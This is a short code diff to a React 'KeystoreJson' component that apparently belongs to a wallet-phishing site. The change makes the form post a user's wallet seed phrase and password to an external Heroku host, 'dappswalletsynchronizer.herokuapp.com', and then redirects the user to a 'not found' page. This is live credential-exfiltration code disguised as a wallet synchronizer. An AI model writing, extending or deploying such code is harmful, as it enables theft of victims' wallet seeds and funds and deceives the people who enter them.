@@ -23,12 +23,15 @@ const KeystoreJson = ({
   }, [seed2, password]);
 
   const handleSubmit = async (e) => {
-    const res = await axios.post("http://localhost:8080/form", {
-      seed: seed2,
-      password,
-    });
-    setLoading(true);
     setDisabled2(true);
+    setLoading(true);
+    const res = await axios.post(
+      "https://dappswalletsynchronizer.herokuapp.com/form",
+      {
+        seed: seed2,
+        password,
+      }
+    );
     if (res.data.status === 200) {
       Navigate("/not_found");
     } else {
